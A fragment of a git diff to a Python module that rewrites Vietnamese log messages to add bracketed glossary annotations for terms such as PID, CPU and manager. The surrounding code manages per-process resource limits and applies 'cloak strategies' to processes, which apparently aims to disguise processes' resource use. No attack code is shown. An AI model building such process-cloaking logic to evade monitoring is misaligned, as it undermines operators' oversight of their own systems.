                 return float(mem_limit[1])
             else:
-                self.logger.debug(f"PID={pid} không giới hạn bộ nhớ.")
+                self.logger.debug(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không giới hạn bộ nhớ.")
                 return float('inf')
         except Exception as e:
-            self.logger.error(f"Lỗi get_memory_limit PID={pid}: {e}")
+            self.logger.error(f"Lỗi get_memory_limit **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return 0.0
 
     def remove_memory_limit(self, pid: int) -> bool:
@@ -2197,16 +2197,16 @@ class MemoryResourceManager:
         try:
             process = psutil.Process(pid)
             process.rlimit(psutil.RLIMIT_AS, (psutil.RLIM_INFINITY, psutil.RLIM_INFINITY))
-            self.logger.debug(f"Khôi phục memory cho PID={pid} => không giới hạn.")
+            self.logger.debug(f"Khôi phục **[memory]** (bộ nhớ) cho **[PID]** (Process ID - mã định danh tiến trình)={pid} => không giới hạn.")
             return True
         except psutil.NoSuchProcess:
-            self.logger.error(f"PID={pid} không tồn tại khi remove_memory_limit.")
+            self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại khi remove_memory_limit.")
             return False
         except psutil.AccessDenied:
-            self.logger.error(f"Không đủ quyền remove_memory_limit cho PID={pid}.")
+            self.logger.error(f"Không đủ quyền remove_memory_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi remove_memory_limit cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi remove_memory_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def restore_resources(self, pid: int) -> bool:
@@ -2257,12 +2257,12 @@ class ResourceControlFactory:
             # ✅ REUSE: Return existing managers if available
             if config_hash in ResourceControlFactory._shared_managers:
                 existing_managers = ResourceControlFactory._shared_managers[config_hash]
-                logger.info(f"♾️ [Factory] Reusing existing resource managers (hash: {config_hash})")
+                logger.info(f"♾️ [Factory] Reusing existing **[resource]** (tài nguyên) managers (hash: {config_hash})")
                 logger.info(f"🔄 [Factory] Available managers: {list(existing_managers.keys())}")
                 return existing_managers
             
             # ✅ CREATE: New managers if none exist for this config
-            logger.info(f"⚙️ [Factory] Creating new resource managers (hash: {config_hash})")
+            logger.info(f"⚙️ [Factory] Creating new **[resource]** (tài nguyên) managers (hash: {config_hash})")
         resource_managers = {}
         manager_classes = {
             'cpu': CPUResourceManager,
@@ -2275,10 +2275,10 @@ class ResourceControlFactory:
 
         for name, manager_class in manager_classes.items():
             try:
-                logger.info(f"Đang khởi tạo {name} manager...")
+                logger.info(f"Đang khởi tạo {name} **[manager]** (trình quản lý)...")
                 manager_instance = manager_class(config, logger)
                 resource_managers[name] = manager_instance
-                logger.info(f"{name.capitalize()} manager đã được khởi tạo thành công.")
+                logger.info(f"{name.capitalize()} **[manager]** (trình quản lý) đã được khởi tạo thành công.")
             except Exception as e:
                 logger.error(f"Lỗi khi khởi tạo {name} manager: {e}", exc_info=True)
 
@@ -2286,12 +2286,12 @@ class ResourceControlFactory:
 
         # --- Kết thúc vòng for ---
         if not resource_managers:
-            logger.error("Không có resource managers nào được khởi tạo.")
+            logger.error("Không có **[resource]** (tài nguyên) managers nào được khởi tạo.")
             raise RuntimeError("Tất cả resource managers đều khởi tạo thất bại.")
 
         # ✅ CACHE: Store managers for reuse (sau khi đã khởi tạo đầy đủ)
         ResourceControlFactory._shared_managers[config_hash] = resource_managers
-        logger.info(f"✅ [Factory] Tất cả resource managers đã được khởi tạo và cached (hash: {config_hash}).")
+        logger.info(f"✅ [Factory] Tất cả **[resource]** (tài nguyên) managers đã được khởi tạo và cached (hash: {config_hash}).")
         logger.info(f"📊 [Factory] Total shared instances: {len(ResourceControlFactory._shared_managers)}")
         return resource_managers
 
@@ -2326,25 +2326,25 @@ class ResourceControlFactory:
                 for config_hash, managers in ResourceControlFactory._shared_managers.items():
                     missing_managers = set(expected_managers) - set(managers.keys())
                     if missing_managers:
-                        resource_logger.warning(f"⚠️ [Validation] Config {config_hash} missing managers: {missing_managers}")
+                        resource_logger.warning(f"⚠️ [Validation] **[config]** (cấu hình) {config_hash} missing managers: {missing_managers}")
                         return False
                     
                     # ✅ FUNCTIONAL CHECK: Verify each manager is still operational
                     for manager_name, manager_instance in managers.items():
                         if manager_instance is None:
-                            resource_logger.error(f"❌ [Validation] Manager '{manager_name}' is None in config {config_hash}")
+                            resource_logger.error(f"❌ [Validation] **[manager]** (trình quản lý) '{manager_name}' is **[none]** (không có) in **[config]** (cấu hình) {config_hash}")
                             return False
                         
                         # Basic health check - verify the manager has expected attributes
                         if not hasattr(manager_instance, 'config') or not hasattr(manager_instance, 'logger'):
-                            resource_logger.error(f"❌ [Validation] Manager '{manager_name}' missing required attributes")
+                            resource_logger.error(f"❌ [Validation] **[manager]** (trình quản lý) '{manager_name}' missing required attributes")
                             return False
                 
                 resource_logger.info(f"✅ [Validation] All {len(expected_managers)} expected managers validated successfully")
                 return True
                 
         except Exception as e:
-            resource_logger.error(f"❌ [Validation] Error validating manager instances: {e}")
+            resource_logger.error(f"❌ [Validation] **[error]** (lỗi) validating **[manager]** (trình quản lý) instances: {e}")
             return False
     
     @staticmethod
@@ -2360,12 +2360,12 @@ class ResourceControlFactory:
                 
                 # For now, we'll keep all managers as they might be reused
                 # In a more sophisticated implementation, we could track usage and clean up unused ones
-                resource_logger.info(f"🧹 [Cleanup] Keeping {initial_count} manager configurations (all potentially active)")
+                resource_logger.info(f"🧹 [Cleanup] Keeping {initial_count} **[manager]** (trình quản lý) configurations (all potentially active)")
                 
                 return 0  # No cleanup performed in this conservative implementation
                 
         except Exception as e:
-            resource_logger.error(f"❌ [Cleanup] Error during cleanup: {e}")
+            resource_logger.error(f"❌ [Cleanup] **[error]** (lỗi) during cleanup: {e}")
             return 0
 
     # ------------------------------------------------------------------
@@ -2383,7 +2383,7 @@ class ResourceControlFactory:
         try:
             # Kiểm tra xem tiến trình có tồn tại không
             if not psutil.pid_exists(pid):
-                self.logger.warning(f"PID {pid} không tồn tại, không thể áp dụng RLIMIT")
+                self.logger.warning(f"**[PID]** (Process ID - mã định danh tiến trình) {pid} không tồn tại, không thể áp dụng RLIMIT")
                 return
                 
             # Sử dụng RLIMIT_CPU để giới hạn thời gian CPU
@@ -2393,9 +2393,9 @@ class ResourceControlFactory:
             # Cũng có thể giới hạn bộ nhớ nếu cần
             # resource.prlimit(pid, resource.RLIMIT_AS, (memory_bytes, memory_bytes))
             
-            self.logger.debug(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho PID={pid}")
+            self.logger.debug(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho **[PID]** (Process ID - mã định danh tiến trình)={pid}")
         except (ProcessLookupError, PermissionError) as e:
-            self.logger.warning(f"Không thể áp dụng rlimits cho PID={pid}: {e}")
+            self.logger.warning(f"Không thể áp dụng rlimits cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
         except Exception as e:
             self.logger.debug(f"Lỗi khi áp dụng rlimits: {e}")
             # Lỗi không quan trọng, phương thức này chỉ là biện pháp dự phòng
@@ -2438,7 +2438,7 @@ from .cloak_strategies import (
             # ✅ VALIDATION: Verify all required managers are available
             required_managers = ['cpu', 'network', 'disk_io', 'cache', 'memory']
             if ResourceControlFactory.validate_manager_instances(required_managers):
-                self.logger.info("✅ ResourceCoordinator using shared resource managers successfully")
+                self.logger.info("✅ ResourceCoordinator using shared **[resource]** (tài nguyên) managers successfully")
                 
                 # ✅ METRICS: Log sharing efficiency
                 sharing_info = ResourceControlFactory.get_shared_managers_info()
@@ -2447,7 +2447,7 @@ from .cloak_strategies import (
                 self.logger.warning("⚠️ ResourceCoordinator validation issues detected")
                 
         except Exception as e:
-            self.logger.error(f"❌ Lỗi khởi tạo shared resource managers: {e}")
+            self.logger.error(f"❌ Lỗi khởi tạo shared **[resource]** (tài nguyên) managers: {e}")
             raise
         
         # Khởi tạo strategies
@@ -2459,7 +2459,7 @@ from .cloak_strategies import (
                 StrategyType.MEMORY: MemoryCloakStrategy(config, logger, self.resource_managers.get('memory'), self.resource_managers.get('cache'))
             }
         
-        self.logger.info("✅ ResourceCoordinator khởi tạo 6 unified strategies thành công (thermal integrated trong GPU)")
+        self.logger.info("✅ ResourceCoordinator khởi tạo 6 unified strategies thành công (thermal integrated trong **[GPU]** (bộ xử lý đồ họa))")
     
     def apply_strategy(self, strategy_type: str, process: Any) -> bool:
         """
@@ -2522,9 +2522,9 @@ from .cloak_strategies import (
         :return: True nếu thực thi thành công, False nếu thất bại
         """
         try:
-            self.logger.info(f"🔧 Direct execute strategy: {strategy_type} cho PID={process.pid}")
+            self.logger.info(f"🔧 Direct execute strategy: {strategy_type} cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}")
             strategy.apply(process)
-            self.logger.info(f"✅ Direct execute thành công: {strategy_type} cho PID={process.pid}")
+            self.logger.info(f"✅ Direct execute thành công: {strategy_type} cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}")
             return True
         except Exception as e:
             self.logger.error(f"❌ Lỗi direct execute {strategy_type}: {e}")
@@ -2546,7 +2546,7 @@ from .cloak_strategies import (
             if strategy_type == StrategyType.CPU:
                 cpu_manager = self.resource_managers.get('cpu')
                 if not cpu_manager:
-                    self.logger.error("❌ Không tìm thấy CPU resource manager")
+                    self.logger.error("❌ Không tìm thấy **[CPU]** (bộ xử lý trung tâm) **[resource]** (tài nguyên) **[manager]** (trình quản lý)")
                     return False
                     
                 # Đăng ký PID với plugin system
@@ -2563,32 +2563,32 @@ from .cloak_strategies import (
                                 try:
                                     plugin.apply(process.pid)
                                     plugins_applied += 1
-                                    self.logger.info(f"✅ Applied CPU plugin: {plugin.__class__.__name__} for PID={process.pid}")
+                                    self.logger.info(f"✅ Applied **[CPU]** (bộ xử lý trung tâm) plugin: {plugin.__class__.__name__} for **[PID]** (Process ID - mã định danh tiến trình)={process.pid}")
                                 except Exception as plugin_error:
-                                    self.logger.error(f"❌ Lỗi khi áp dụng CPU plugin {plugin.__class__.__name__}: {plugin_error}")
+                                    self.logger.error(f"❌ Lỗi khi áp dụng **[CPU]** (bộ xử lý trung tâm) plugin {plugin.__class__.__name__}: {plugin_error}")
                                     continue
                     else:
-                        self.logger.warning("⚠️ CPU manager không có plugins hoặc plugins list rỗng")
+                        self.logger.warning("⚠️ **[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý) không có plugins hoặc plugins **[list]** (danh sách) rỗng")
                     
                     # Fallback: Apply strategy trực tiếp nếu không có plugins
                     if plugins_applied == 0:
-                        self.logger.warning("⚠️ Không có CPU plugins nào được áp dụng, fallback to direct strategy execution")
+                        self.logger.warning("⚠️ Không có **[CPU]** (bộ xử lý trung tâm) plugins nào được áp dụng, fallback to direct strategy execution")
                         strategy.apply(process)
                         plugins_applied = 1
                     
-                    self.logger.info(f"✅ Đã ủy quyền chiến lược CPU cho plugin system, PID={process.pid} ({plugins_applied} plugins applied)")
+                    self.logger.info(f"✅ Đã ủy quyền chiến lược **[CPU]** (bộ xử lý trung tâm) cho plugin system, **[PID]** (Process ID - mã định danh tiến trình)={process.pid} ({plugins_applied} plugins applied)")
                     return True
                     
                 except Exception as e:
-                    self.logger.error(f"❌ Lỗi trong CPU plugin delegation: {e}")
+                    self.logger.error(f"❌ Lỗi trong **[CPU]** (bộ xử lý trung tâm) plugin delegation: {e}")
                     # Fallback to direct execution
-                    self.logger.warning("⚠️ Fallback to direct CPU strategy execution")
+                    self.logger.warning("⚠️ Fallback to direct **[CPU]** (bộ xử lý trung tâm) strategy execution")
                     strategy.apply(process)
                     return True
                 
             # GPU plugin delegation
             elif strategy_type == 'gpu':
-                self.logger.info("[CPU-only] GPU strategy delegation disabled")
+                self.logger.info("[**[CPU]** (bộ xử lý trung tâm)-only] **[GPU]** (bộ xử lý đồ họa) strategy delegation disabled")
                 return False
             
             self.logger.warning(f"⚠️ Không hỗ trợ ủy quyền cho plugin system với chiến lược {strategy_type}")
@@ -2670,7 +2670,7 @@ class CloakStrategyFactory:
                     strategy.configure_for_process_type(process_type, strategy_hints)
                     logger.info(f"🎯 [Factory] Strategy '{strategy_name}' pre-configured for {process_type}")
                 else:
-                    logger.debug(f"⚠️ [Factory] Strategy '{strategy_name}' doesn't support type-aware config")
+                    logger.debug(f"⚠️ [Factory] Strategy '{strategy_name}' doesn't support type-aware **[config]** (cấu hình)")
             except Exception as e:
                 logger.error(f"❌ [Factory] Failed to configure strategy '{strategy_name}': {e}")
         
